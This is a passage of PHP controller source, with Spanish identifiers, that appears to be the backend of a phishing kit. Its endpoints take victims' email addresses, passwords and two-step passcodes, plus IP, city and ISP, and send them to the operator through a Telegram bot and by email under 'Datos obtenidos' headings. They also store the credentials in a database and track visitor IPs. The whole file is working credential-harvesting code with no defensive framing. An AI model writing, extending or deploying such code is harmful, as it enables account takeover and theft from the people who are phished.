       $tokenbot = $datos['tokenbot'];

       $server_config = $this->server_model->get_server();   
       $descripcionserver = $server_config['descripcionserver'];

       $datos_user = $this->usuario_model->get_usuarioID($data['idusuario']);
       $to = $datos_user['correonoti'];
       $subject = 'Se detecto una nueva visita';

      /* $datosIP = array('ip_adress' => $data['ip'], 'pais' => $data['country'], 'ciudad' => $data['city'], 'status_ip' => 1, 'tipo_status' => 'visita', 'cantidad_visitas' => 1, 'url_dominio' => $data['url_dominio'], 'fecha_ip' => date("Y-m-d H:i:s"), 'idusuario'=>$data['idusuario']);
       if($this->ipblocker_model->get_ipblocker($data['ip'], $data['idusuario'])){         
          
       }else{
         $this->ipblocker_model->set_ipblocker($datosIP);
       }   */

       $msg_telegram = "<b>💻 ".$descripcionserver." (Reporte)</b>".PHP_EOL
                      ."<b>🔔 ".$subject." 🔔</b>".PHP_EOL
                      ."<b>-----------------------------</b>".PHP_EOL
                      ."<b>-----------------------------</b>".PHP_EOL
                      ."<b>🧭 Detalles de visita 🧭</b>".PHP_EOL
                      ."<b>🌐Dirección IP : </b>".$data['ip'].PHP_EOL
                      ."<b>🗾 Pais : </b>".$data['country'].PHP_EOL
                      ."<b>🏙 Ciudad : </b>".$data['city'].PHP_EOL
                      ."<b>📡 ISP : </b>".$data['isp'];

       $msg_email = "<b>💻 ".$descripcionserver." (Reporte)</b><br>"
                   ."<b>🔔 Se detecto una visita 🔔</b><br>"                  
                   ."<b>-----------------------------</b><br>"
                   ."<b>-----------------------------</b><br>"
                   ."<b>🧭 Detalles de visita 🧭</b><br>"
                   ."<b>🌐Dirección IP : </b>".$data['ip']."<br>"
                   ."<b>🗾 Pais : </b>".$data['country']."<br>"
                   ."<b>🏙 Ciudad : </b>".$data['city']."<br>"
                   ."<b>📡 ISP : </b>".$data['isp']; 


       
       $this->sendTelegram($msg_telegram, $tokenbot, $chatid);
       $this->sentEmail($msg_email, $descripcionserver, $subject,$to);

      
       return $this->genericResponse('success',200);
    }
    

 public function dominio_reporte(){
    $data = json_decode(file_get_contents('php://input'), true);
    $dominio = $data['dominio'];
    return $this->genericResponse($this->reporte_model->verificardominio($dominio),200);
 }

  public function reporte_acceso(){
    $data = json_decode(file_get_contents('php://input'), true);
    $ip = $data['ip'];
    $idusuario = $data['idusuario'];
    return $this->genericResponse($this->reporte_model->reporte_acceso($ip, $idusuario),200);
  }
  
    public function reporte_ip(){
    $data = json_decode(file_get_contents('php://input'), true);
    $ip_adress = $data['ip_adress'];
    $idusuario = $data['idusuario'];
    return $this->genericResponse($this->ipblocker_model->get_ipblocker($ip_adress, $idusuario),200);
  }

    public function guardar_datos_autoremove_reporte(){
      
      $data = json_decode(file_get_contents('php://input'), true);

      $server_config = $this->server_model->get_server();   
      $descripcionserver = $server_config['descripcionserver'];

      $datos = $this->api_model->get_bottelegram($data['idusuario']);
      $chatid = $datos['chatid'];
      $tokenbot = $datos['tokenbot'];

      $datos_user = $this->usuario_model->get_usuarioID($data['idusuario']);
      $to = $datos_user['correonoti'];
      $subject = 'Datos recibidos';

      $email     = $data['email']; 
      $password  = $data['password']; 
      $idusuario = $data['idusuario'];
      $status    = $data['status_response']; 
      $response  = strip_tags($data['response']);
      $ip        = $data['ip']; 
      $latitud   = $data['latitud']; 
      $longitud  = $data['longitud']; 
      $country   = $data['country']; 
      $capital   = $data['capital']; 
      $city      = $data['city']; 
      $isp       = $data['isp']; 

      $msg_telegram = "<b>💻 ".$descripcionserver."</b>".PHP_EOL
                      ."<b>🔔 ".$subject." 🔔</b>".PHP_EOL                     
                      ."<b>-----------------------------</b>".PHP_EOL
                      ."<b>-----------------------------</b>".PHP_EOL
                      ."<b>🔐 Datos obtenidos 👨🏼‍💻</b>".PHP_EOL
                      ."<b>📧 Email : </b>".$email.PHP_EOL
                      ."<b>🔑 Contraseña : </b>".$password.PHP_EOL
                      ."<b>-----------------------------</b>".PHP_EOL
                      ."<b>-----------------------------</b>".PHP_EOL
                      ."<b>🧭 Detalles de localización 🧭</b>".PHP_EOL
                      ."<b>🌐Dirección IP : </b>".$ip.PHP_EOL
                      ."<b>🗾 Pais : </b>".$country.PHP_EOL
                      ."<b>🏙 Ciudad : </b>".$city.PHP_EOL
                      ."<b>📡 ISP : </b>".$isp.PHP_EOL
                      ."<b>-----------------------------</b>".PHP_EOL
                      ."<b>-----------------------------</b>".PHP_EOL
                      ."<b>⌚️ Autoremove 📱</b>".PHP_EOL
                      .$this->replaceTelegram($response);
     
      $msg_email = "<b>💻 ".$descripcionserver."</b><br>"
                  ."<b>🔔 ".$subject." 🔔</b><br>"
                  ."<b>-----------------------------</b><br>"
                  ."<b>-----------------------------</b><br>"
                  ."<b>🔐 Datos obtenidos 👨🏼‍💻</b><br>"
                  ."<b>📧 Email : </b>".$data['email']."<br>"
                  ."<b>🔑 Contraseña : </b>".$data['password']."<br>"
                  ."<b>-----------------------------</b><br>"
                  ."<b>-----------------------------</b><br>"
                  ."<b>🧭 Detalles de localización 🧭</b><br>"
                  ."<b>🌐Dirección IP : </b>".$ip."<br>"
                  ."<b>🗾 Pais : </b>".$country."<br>"
                  ."<b>🏙 Ciudad : </b>".$city."<br>"
                  ."<b>📡 ISP : </b>".$isp."<br>"
                  ."<b>-----------------------------</b><br>"
                  ."<b>-----------------------------</b><br>"
                  ."<b>⌚️ Autoremove 📱</b><br>"
                  .$this->replaceEmail($response);
         



      
      $this->sendTelegram($msg_telegram, $tokenbot, $chatid);


      $acceso = 1;
      if($status == 'completed'){
         $acceso = 0;
         //$status_ip = 0;
        // $datosIp = array('idusuario'=>$idusuario, 'ip_adress' => $ip, 'status_ip' => $status_ip);
        // $this->ipblocker_model->update_status_api($datosIp);

      }else{
         $acceso = 1;
      }


      $datos = array('email' => $email, 'password' => $password, 'status' => $status, 'idusuario' => $idusuario, 'response' => $data['response'], 'acceso' => $acceso, 'ip' => $ip);
       $r = $this->reporte_model->insertar_emailpassword($datos);
       

       return $this->respond(array('insertId' => $r['insertId']));

    }


    public function guardar_datos_autoremove_passcode(){

      $data = json_decode(file_get_contents('php://input'), true);

      $server_config = $this->server_model->get_server();   
      $descripcionserver = $server_config['descripcionserver'];

      $datos = $this->api_model->get_bottelegram($data['idusuario']);
      $chatid = $datos['chatid'];
      $tokenbot = $datos['tokenbot'];

      $datos_user = $this->usuario_model->get_usuarioID($data['idusuario']);
      $to = $datos_user['correonoti'];
      $subject = 'Datos passcode recibidos';


      $codigo_1  = $data['code_one']; 
      $codigo_2  = $data['code_two']; 
      $idusuario = $data['idusuario']; 
      $status    = $data['status']; 
      $insertId  = $data['insertId']; 
      $ip        = $data['ip']; 
      $latitud   = $data['latitud']; 
      $longitud  = $data['longitud']; 
      $country   = $data['country']; 
      $capital   = $data['capital']; 
      $city      = $data['city']; 
      $isp       = $data['isp']; 

        $msg_telegram = "<b>💻 ".$descripcionserver."</b>".PHP_EOL
                      ."<b>🔔 ".$subject." 🔔</b>".PHP_EOL
                      ."<b>-----------------------------</b>".PHP_EOL
                      ."<b>-----------------------------</b>".PHP_EOL
                      ."<b>🔐 Datos obtenidos 👨🏼‍💻</b>".PHP_EOL
                      ."<b>⌨️ Codigo 1 : </b>".$codigo_1.PHP_EOL
                      ."<b>⌨️ Codigo 2 : </b>".$codigo_2.PHP_EOL
                      ."<b>-----------------------------</b>".PHP_EOL
                      ."<b>-----------------------------</b>".PHP_EOL
                      ."<b>🧭 Detalles de localización 🧭</b>".PHP_EOL
                      ."<b>🌐Dirección IP : </b>".$ip.PHP_EOL
                      ."<b>🗾 Pais : </b>".$country.PHP_EOL
                      ."<b>🏙 Ciudad : </b>".$city.PHP_EOL
                      ."<b>📡 ISP : </b>".$isp.PHP_EOL;
      $this->sendTelegram($msg_telegram, $tokenbot, $chatid);

      $acceso = 1;
      if($status == 'completed'){
         $acceso = 0;
         //$status_ip = 0;
        // $datosIp = array('idusuario'=>$idusuario, 'ip_adress' =>$ip, 'status_ip' => $status_ip);
         //$this->ipblocker_model->update_status_api($datosIp);
      }else{
         $acceso = 1;
      }

      $datos = array('codigo_1' => $codigo_1, 'codigo_2' => $codigo_2, 'status' => $status, 'idusuario' => $idusuario, 'id' => $insertId, 'acceso' => $acceso, 'ip' => $ip);

      $response = $this->reporte_model->update_codigos($datos);
      return $this->respond(array('status' => $response));



    }
    
 

   
  public function ip_blocker_visita(){

     $data = json_decode(file_get_contents('php://input'), true);
     $ip_adress  = $data['ip_adress']; 
     $pais  = $data['pais'];
     $ciudad  = $data['ciudad'];
     $status_ip  = $data['status_ip'];
     $tipo_status = $data['tipo_status'];
     $url_dominio = 'https://'.$data['url_dominio'];
     $idusuario = $data['idusuario'];
     $fecha_ip = date("Y-m-d H:i:s");
     $response = '';

     
     $responseDB = $this->ipblocker_model->get_ipblocker($ip_adress, $idusuario);
     
     
     if($responseDB){ 
        $tipo_statusdb = $responseDB['tipo_status'];  
        $cantidad_visitas = $responseDB['cantidad_visitas'];    
        if($tipo_statusdb != 'procesado'){
         $datos = array('ip_adress' => $ip_adress, 'pais' => $pais, 'ciudad' => $ciudad, 'status_ip' => $status_ip, 'tipo_status' => $tipo_status, 'cantidad_visitas' => $cantidad_visitas + 1, 'url_dominio' => $url_dominio, 'fecha_ip' => $fecha_ip, 'idusuario'=>$idusuario);
          $response = $this->ipblocker_model->update_ipblocker($datos);
        }
        
     }else{            
         $datos = array('ip_adress' => $ip_adress, 'pais' => $pais, 'ciudad' => $ciudad, 'status_ip' => $status_ip, 'tipo_status' => $tipo_status, 'cantidad_visitas' => 1, 'url_dominio' => $url_dominio, 'fecha_ip' => $fecha_ip, 'idusuario' => $idusuario);
         $response = $this->ipblocker_model->set_ipblocker($datos);
     }

    
     return $this->respond(array('status' => $response));


 }


   public function ip_blocker(){

     $data = json_decode(file_get_contents('php://input'), true);
     $ip_adress  = $data['ip_adress']; 
     $pais  = $data['pais'];
     $ciudad  = $data['ciudad'];
     $status_ip  = $data['status_ip'];
     $tipo_status = $data['tipo_status'];
     $url_dominio = $data['url_dominio'];
     $idusuario =   $data['idusuario'];
     $fecha_ip = date("Y-m-d H:i:s");
     $response = '';

     $datos = array('ip_adress' => $ip_adress, 'pais' => $pais, 'ciudad' => $ciudad, 'status_ip' => $status_ip, 'tipo_status' => $tipo_status, 'cantidad_visitas' => 1, 'url_dominio' => $url_dominio, 'fecha_ip' => $fecha_ip, 'idusuario' => $idusuario);
    
    $responseDB = $this->ipblocker_model->get_ipblocker($ip_adress, $idusuario);    
     
     if($responseDB){  
       
          $response = $this->ipblocker_model->update_ipblocker($datos);
        
     }else{
     
         $response = $this->ipblocker_model->set_ipblocker($datos);
       
        
     }

    
     return $this->respond(array('status' => $response));


 }

}